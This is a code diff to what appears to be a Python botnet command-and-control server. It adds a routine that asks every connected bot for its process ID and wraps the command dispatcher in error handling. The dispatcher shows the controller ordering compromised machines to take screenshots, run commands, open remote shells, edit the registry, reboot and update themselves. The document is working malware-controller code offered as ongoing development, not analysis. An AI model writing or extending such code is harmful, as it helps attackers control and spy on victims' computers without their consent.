@@ -178,49 +178,68 @@ def reboot_botnet():
         except:
             print("[*] Failed to reboot %s"%(bot))
 
+def get_pid():
+    global botnet
+    for bot in botnet:
+        try:
+            botnet[bot].send("pid".encode())
+            pid = botnet[bot].recv(1024).decode()
+            print("%s PID : %s"%(bot,pid))
+        except socket.error:
+            print("[*] %s : Dead"%(bot))
+        except:
+            print("[*] Failed to get PID from %s"%(bot))
+
 def process_cmd(cmd):
         global botnet
         sleep(1)
 
-        if "restart" in cmd:
-            reboot_botnet()
+        try:
+            if "pid" in cmd:
+                get_pid()
 
-        if "updater" in cmd:
-            updater_thread = Thread(target=update_botnet,args=())
-            updater_thread.start()
+            if "restart" in cmd:
+                reboot_botnet()
 
-        if(cmd == "show botnet"):
-            count = 1
-            for bot in botnet:
-                print("[*] %d : %s"%(count,str(bot)))
-                count += 1
+            if "updater" in cmd:
+                updater_thread = Thread(target=update_botnet,args=())
+                updater_thread.start()
 
-        if "screenshot" in cmd:
-            addr = cmd.strip("screenshot ")
-            get_screenshot(addr)
+            if(cmd == "show botnet"):
+                count = 1
+                for bot in botnet:
+                    print("[*] %d : %s"%(count,str(bot)))
+                    count += 1
 
-        if 'execute' in cmd:
-            #cmd = cmd.strip("execute ")
-            exec_command(cmd)
-            print("[*] Command packets sent!")
+            if "screenshot" in cmd:
+                addr = cmd.strip("screenshot ")
+                get_screenshot(addr)
 
-        if(cmd == "get os"):
-            detect_os()
+            if 'execute' in cmd:
+                #cmd = cmd.strip("execute ")
+                exec_command(cmd)
+                print("[*] Command packets sent!")
 
-        if "shell" in cmd:
-            shell_exec(cmd)
+            if(cmd == "get os"):
+                detect_os()
 
-        if "registry" in cmd:
-            edit_registry()
+            if "shell" in cmd:
+                shell_exec(cmd)
 
-        if 'test' in cmd:
-            cmd = cmd.strip("test ")
-            t1 = Thread(target=test_bots,args=())
-            t1.start()
-            pass
-        else:
-            print("[*] Invalid command")
+            if "registry" in cmd:
+                edit_registry()
 
+            if 'test' in cmd:
+                cmd = cmd.strip("test ")
+                t1 = Thread(target=test_bots,args=())
+                t1.start()
+                pass
+            else:
+                print("[*] Invalid command")
+        except socket.error:
+            print("[*] Socket error")
+        except:
+            print("[*] Error occurred while processing command")
 
 def main():
     try:
